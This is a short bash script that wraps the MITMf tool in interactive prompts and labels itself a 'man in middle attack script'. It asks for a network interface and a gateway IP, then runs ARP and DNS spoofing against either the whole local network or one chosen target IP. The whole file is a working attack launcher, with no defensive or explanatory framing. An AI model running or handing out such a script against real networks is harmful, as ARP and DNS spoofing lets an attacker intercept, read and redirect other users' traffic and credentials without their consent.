#!/bin/bash 
#EX:mitmf -i wlan0 --spoof --arp --dns --gateway 192.168.1.1 --target 192.168.1.10
echo "" 
echo " ------- Mitmf [ man in middle attack script ] --------------------"

echo " [+] write all options in correct ways .."


echo -n " howdy!, please type your interface type ?"
read -e interface
echo ""
echo -n " enter gateway ip address ? " 
read -e gateway 
echo "" 
echo " choose target type " ? 
echo  "1.All network" 
echo  "2.Select a target " 
echo  "Mitm>"
read -e targets 
case $targets in 
'1') 
mitmf -i $interface --spoof --arp --dns --gateway $gateway;;
'2')

echo " Write a target ip address or leave it blank for all network?"
read -e target 

echo " .....ready .... " 

mitmf -i $interface --spoof --arp --dns --gateway $gateway --target $target;;

esac 



